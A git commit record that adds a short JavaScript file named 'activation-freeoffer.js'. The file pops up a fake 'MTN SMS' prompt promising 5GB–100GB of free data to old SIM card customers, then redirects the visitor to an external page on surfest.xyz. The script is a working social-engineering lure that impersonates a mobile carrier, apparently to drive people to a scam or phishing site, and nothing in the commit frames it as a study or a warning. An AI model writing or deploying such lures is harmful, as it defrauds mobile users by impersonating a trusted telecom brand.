25c214f5536991238883999254a35db4cec27a0f
inemitid <asuquodavid021@gmail.com>
2025-05-15 22:27:48 -0700

    Create activation-freeoffer.js

---
+++ activation-freeoffer.js
@@ -0,0 +1,5 @@
+var password = 'FREE DATA'
+password=prompt('MTN SMS: Dear Customer, Kindly Check If Your MTN Sim Card Is Qualify To Receive Free Data From 5GB - 100GB! FREE DATA To Old Sim Card Customers, Press Free Data To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://surfest.xyz/mtn-freeoffer.html';
+}
